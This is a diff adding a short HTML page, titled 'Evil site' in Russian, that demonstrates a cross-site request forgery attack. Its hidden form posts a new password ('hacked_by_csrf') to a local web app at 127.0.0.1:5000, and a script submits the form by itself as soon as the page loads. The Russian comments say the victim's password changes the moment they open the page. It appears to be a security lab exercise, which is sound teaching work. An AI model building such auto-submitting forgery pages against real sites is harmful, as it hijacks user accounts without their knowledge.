@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Злой сайт 😈</title>
+</head>
+<body>
+  <h2>Злой сайт</h2>
+  <p>Когда жертва откроет эту страницу, её пароль изменится автоматически!</p>
+
+  <!-- Скрытая форма, которая отправит POST-запрос -->
+  <form action="http://127.0.0.1:5000/" method="POST" id="hack-form">
+    <input type="hidden" name="password" value="hacked_by_csrf">
+  </form>
+
+  <script>
+    // Автоматически отправляем форму при загрузке
+    document.getElementById("hack-form").submit();
+  </script>
+</body>
+</html>
